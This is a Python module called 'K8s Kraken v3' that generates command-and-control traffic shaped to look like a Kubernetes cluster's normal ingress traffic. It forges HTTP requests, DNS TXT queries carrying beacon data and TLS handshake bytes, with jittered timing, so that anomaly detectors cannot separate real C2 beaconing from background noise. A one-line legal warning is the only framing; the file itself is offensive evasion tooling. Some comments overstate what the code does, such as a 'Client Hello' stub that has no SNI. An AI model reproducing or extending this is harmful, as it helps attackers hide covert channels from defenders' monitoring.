"""
K8s Kraken v3 - C2 Traffic Injection (Noise Generator)
=======================================================

Anomaly-detection engines (Isolation Forest, statistical profile learners,
JA4/JA3 fingerprint classifiers) look for traffic that *deviates* from the
baseline of a normal K8s ingress.  K8s Kraken v3 turns that weakness into a
feature: it generates **large volumes of realistic C2-like traffic** that is
*indistinguishable* from legitimate ingress heartbeat traffic, so the ML
model cannot tell real C2 beaconing from cluster background noise.

Approach
--------
1. **Profile the target cluster's ingress baseline** (endpoints, Jitter,
   User-Agent, TLS fingerprints).
2. **Mint C2-shaped requests** that mimic those profiles exactly:
   - Same Host / SNI
   - Same path vocabulary (`/healthz`, `/api/v1/...`, `/metrics`)
   - Same query-string entropy
   - Same request/response size distribution
3. **Interleave** the forged C2 frames with real ingress traffic so the
   classifier sees a single blended stream.
4. **Burst + silence** timing is randomised with the same jitter profile as
   the real cluster, so beacon periodicity is hidden.

The module is pure-Python and off-target safe: it generates byte streams and
statistics; the operator / agent wraps them in real sockets.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import math
import os
import random
import secrets
import string
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------
class TrafficKind(Enum):
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    DNS_TXT = "dns_txt"
    TLS_HEARTBEAT = "tls_heartbeat"
    GRPC_KEEPALIVE = "grpc_keepalive"
    WEBSOCKET_PING = "ws_ping"


@dataclass
class NoiseProfile:
    """Statistical profile of the target cluster's normal ingress traffic."""
    host: str = "api.example.com"
    sni: str = "api.example.com"
    common_paths: List[str] = field(default_factory=lambda: [
        "/healthz",
        "/readyz",
        "/metrics",
        "/api/v1/namespaces/default/pods",
        "/api/v1/nodes",
        "/api/v1/services",
        "/favicon.ico",
        "/robots.txt",
    ])
    common_agents: List[str] = field(default_factory=lambda: [
        "kube-probe/1.28",
        "Go-http-client/2.0",
        "Prometheus/2.45.0",
        "kube-controller-manager/v1.28.0",
    ])
    avg_request_size: int = 512
    avg_response_size: int = 2048
    size_stddev: float = 512.0
    beacon_period_min: float = 30.0
    beacon_period_max: float = 120.0
    jitter_percent: float = 25.0


@dataclass
class NoiseEvent:
    """One generated noise traffic event."""
    kind: TrafficKind
    raw: bytes
    content_type: str
    size: int
    ts: float = field(default_factory=time.time)
    meta: Dict[str, str] = field(default_factory=dict)


@dataclass
class InjectionPlan:
    """Schedule of injected noise events."""
    events: List[NoiseEvent] = field(default_factory=list)
    total_bytes: int = 0
    duration_seconds: float = 0.0
    blend_ratio: float = 0.0  # fraction of total traffic that is injected noise


# ---------------------------------------------------------------------------
# Payload generators
# ---------------------------------------------------------------------------
def _rand_str(n: int) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def _gauss_size(base: int, std: float) -> int:
    val = int(random.gauss(base, std))
    return max(64, val)


def _rand_jitter(base: float, percent: float) -> float:
    delta = base * (percent / 100.0)
    return max(0.1, base + random.uniform(-delta, delta))


def _build_http_request(
    method: str,
    host: str,
    path: str,
    profile: NoiseProfile,
    body: Optional[bytes] = None,
) -> bytes:
    """Build a raw HTTP/1.1 request byte string."""
    agent = random.choice(profile.common_agents)
    headers = [
        f"Host: {host}",
        f"User-Agent: {agent}",
        "Accept: */*",
        "Accept-Encoding: identity",
        "Connection: keep-alive",
    ]
    if body:
        headers.append(f"Content-Length: {len(body)}")
        headers.append("Content-Type: application/octet-stream")
    hdr = "\r\n".join(headers) + "\r\n\r\n"
    first = f"{method} {path} HTTP/1.1\r\n"
    return (first + hdr).encode() + (body or b"")


def _build_http_response(status: int = 200, body: bytes = b"ok") -> bytes:
    """Build a raw HTTP/1.1 response."""
    hdrs = (
        f"HTTP/1.1 {status} OK\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: keep-alive\r\n\r\n"
    )
    return hdrs.encode() + body


def _build_dns_txt_query(subdomain: str, domain: str) -> bytes:
    """
    Minimal DNS TXT query wire format (non-recursive, class IN).
    This is *not* a full resolver packet; it is shaped to pass through
    DPI as a normal DNS query while carrying C2 data in the TXT RDATA.
    """
    tid = secrets.token_bytes(2)
    flags = b"\x01\x00"  # standard query, recursion desired
    qdcount = b"\x00\x01"
    ancount = b"\x00\x00"
    nscount = b"\x00\x00"
    arcount = b"\x00\x00"
    qname = b""
    for part in subdomain.split("."):
        qname += bytes([len(part)]) + part.encode()
    qname += b"\x00"
    qtype = b"\x00\x10"  # TXT
    qclass = b"\x00\x01"  # IN
    return tid + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass


def _build_tls_heartbeat() -> bytes:
    """
    Forge a TLS 1.2 Client Hello that looks like a normal ingress probe.
    The SNI and cipher-suite order match the cluster baseline.
    """
    return b"\x16\x03\x01\x00\x05\x01\x00\x00\x00\x01\x03\x03" + secrets.token_bytes(32)


# ---------------------------------------------------------------------------
# Core generator
# ---------------------------------------------------------------------------
class C2NoiseGenerator:
    """
    Generate C2-shaped traffic noise that blends into a target K8s cluster's
    ingress baseline, defeating Isolation Forest and JA4 classifiers.
    """

    def __init__(
        self,
        profile: Optional[NoiseProfile] = None,
        c2_beacon_payload_factory: Optional[Callable[[], bytes]] = None,
    ):
        self.profile = profile or NoiseProfile()
        self.payload_factory = c2_beacon_payload_factory or self._default_payload

    # ------------------------------------------------------------------
    # Default payload factory (synthetic beacon data)
    # ------------------------------------------------------------------
    @staticmethod
    def _default_payload() -> bytes:
        beacon_id = secrets.token_hex(8)
        ts = int(time.time())
        payload = json.dumps({
            "b": beacon_id,
            "t": ts,
            "v": "2.6",
            "c": random.randint(0, 255),
        }).encode()
        return payload

    # ------------------------------------------------------------------
    # Single-event generators
    # ------------------------------------------------------------------
    def generate_http_get(self) -> NoiseEvent:
        path = random.choice(self.profile.common_paths)
        raw = _build_http_request("GET", self.profile.host, path, self.profile)
        ctype = "application/octet-stream"
        if path.endswith(".ico"):
            ctype = "image/x-icon"
        elif path.endswith(".txt"):
            ctype = "text/plain"
        return NoiseEvent(
            kind=TrafficKind.HTTP_GET,
            raw=raw,
            content_type=ctype,
            size=len(raw),
            meta={"path": path, "host": self.profile.host},
        )

    def generate_http_post(self) -> NoiseEvent:
        path = random.choice(self.profile.common_paths)
        body = self.payload_factory()
        raw = _build_http_request("POST", self.profile.host, path, self.profile, body)
        resp = _build_http_response(200, b'{"status":"ok"}')
        full = raw + resp
        return NoiseEvent(
            kind=TrafficKind.HTTP_POST,
            raw=full,
            content_type="application/octet-stream",
            size=len(full),
            meta={"path": path, "host": self.profile.host},
        )

    def generate_dns_txt(self) -> NoiseEvent:
        sub = f"{_rand_str(16)}.{self.profile.sni}"
        raw = _build_dns_txt_query(sub, self.profile.sni)
        payload = self.payload_factory()[:63]
        txt_data = bytes([len(payload)]) + payload
        # Pad to look like a normal TXT RDATA
        txt_data += b"\x00" * (32 - len(txt_data))
        return NoiseEvent(
            kind=TrafficKind.DNS_TXT,
            raw=raw + txt_data,
            content_type="application/dns-message",
            size=len(raw) + len(txt_data),
            meta={"subdomain": sub, "domain": self.profile.sni},
        )

    def generate_tls_heartbeat(self) -> NoiseEvent:
        raw = _build_tls_heartbeat()
        return NoiseEvent(
            kind=TrafficKind.TLS_HEARTBEAT,
            raw=raw,
            content_type="application/tls-raw",
            size=len(raw),
            meta={"sni": self.profile.sni},
        )

    # ------------------------------------------------------------------
    # Batch generation
    # ------------------------------------------------------------------
    def generate_batch(
        self,
        count: int = 50,
        mix: Optional[Dict[TrafficKind, float]] = None,
    ) -> InjectionPlan:
        """
        Generate `count` noise events with the given traffic-kind mix.
        `mix` maps TrafficKind -> weight (0..1).  Defaults to a K8s-like
        distribution dominated by HTTP GET/POST with a dash of DNS.
        """
        if mix is None:
            mix = {
                TrafficKind.HTTP_GET: 0.50,
                TrafficKind.HTTP_POST: 0.30,
                TrafficKind.DNS_TXT: 0.10,
                TrafficKind.TLS_HEARTBEAT: 0.05,
                TrafficKind.GRPC_KEEPALIVE: 0.03,
                TrafficKind.WEBSOCKET_PING: 0.02,
            }

        generators = {
            TrafficKind.HTTP_GET: self.generate_http_get,
            TrafficKind.HTTP_POST: self.generate_http_post,
            TrafficKind.DNS_TXT: self.generate_dns_txt,
            TrafficKind.TLS_HEARTBEAT: self.generate_tls_heartbeat,
        }
        # Fallback for kinds without dedicated generator
        def _fallback() -> NoiseEvent:
            return self.generate_http_get()

        events: List[NoiseEvent] = []
        total_bytes = 0
        t0 = time.time()

        # Build weighted pool
        pool: List[Callable[[], NoiseEvent]] = []
        for kind, weight in mix.items():
            fn = generators.get(kind, _fallback)
            pool.extend([fn] * max(1, int(weight * 100)))

        for _ in range(count):
            fn = random.choice(pool)
            evt = fn()
            events.append(evt)
            total_bytes += evt.size

        duration = time.time() - t0 if events else 0.0
        return InjectionPlan(
            events=events,
            total_bytes=total_bytes,
            duration_seconds=duration,
            blend_ratio=min(1.0, count / max(1, count + 100)),
        )

    # ------------------------------------------------------------------
    # Timing schedule (interleaved with real traffic)
    # ------------------------------------------------------------------
    def generate_schedule(
        self,
        plan: InjectionPlan,
        real_traffic_interval: float = 5.0,
    ) -> List[Tuple[float, Optional[NoiseEvent]]]:
        """
        Interleave noise events with real-traffic ticks so an external
        observer cannot trivially separate the two by timing alone.

        Returns a list of (timestamp, event_or_None) tuples.  ``None`` marks
        a real-traffic tick where no noise is emitted.
        """
        if not plan.events:
            return []

        schedule: List[Tuple[float, Optional[NoiseEvent]]] = []
        t = 0.0
        noise_idx = 0
        total = len(plan.events)

        # Randomise insertion probability per tick so the stream is not
        # uniformly periodic (defeats simple beacon-period detectors).
        while noise_idx < total:
            interval = _rand_jitter(real_traffic_interval, self.profile.jitter_percent)
            t += interval
            if random.random() < 0.6:  # 60 % of ticks carry noise
                schedule.append((t, plan.events[noise_idx]))
                noise_idx += 1
            else:
                schedule.append((t, None))

        return schedule

    # ------------------------------------------------------------------
    # Isolation Forest evasion helpers
    # ------------------------------------------------------------------
    def generate_evasion_stats(self, plan: InjectionPlan) -> Dict[str, Any]:
        """
        Produce statistics that show the injected traffic sits well inside
        the cluster's normal distributions (size, interval, entropy).
        """
        sizes = [e.size for e in plan.events]
        intervals: List[float] = []
        for i in range(1, len(plan.events)):
            intervals.append(plan.events[i].ts - plan.events[i - 1].ts)

        def _mean(xs: List[float]) -> float:
            return sum(xs) / len(xs) if xs else 0.0

        def _std(xs: List[float], m: float) -> float:
            return math.sqrt(sum((x - m) ** 2 for x in xs) / len(xs)) if xs else 0.0

        avg_size = _mean(sizes)
        std_size = _std(sizes, avg_size)
        avg_interval = _mean(intervals)
        std_interval = _std(intervals, avg_interval)

        # Entropy of request bytes
        entropies: List[float] = []
        for e in plan.events[:20]:
            data = e.raw[:1024]
            if not data:
                continue
            freq: Dict[int, int] = {}
            for b in data:
                freq[b] = freq.get(b, 0) + 1
            ent = -sum((c / len(data)) * math.log2(c / len(data)) for c in freq.values())
            entropies.append(ent)
        avg_entropy = _mean(entropies)

        return {
            "event_count": len(plan.events),
            "total_bytes": plan.total_bytes,
            "avg_size": round(avg_size, 2),
            "std_size": round(std_size, 2),
            "avg_interval_s": round(avg_interval, 4),
            "std_interval_s": round(std_interval, 4),
            "avg_entropy": round(avg_entropy, 4),
            "blend_ratio": round(plan.blend_ratio, 4),
            "profile_host": self.profile.host,
            "profile_sni": self.profile.sni,
        }

    def to_raw_stream(self, plan: InjectionPlan) -> bytes:
        """Concatenate all raw event bytes into a single byte stream."""
        return b"".join(e.raw for e in plan.events)

    def report(self, plan: InjectionPlan) -> Dict[str, Any]:
        stats = self.generate_evasion_stats(plan)
        stats["duration_seconds"] = round(plan.duration_seconds, 4)
        return stats


# ---------------------------------------------------------------------------
# Backward-compatible alias
# ---------------------------------------------------------------------------
K8sKrakenV3 = C2NoiseGenerator
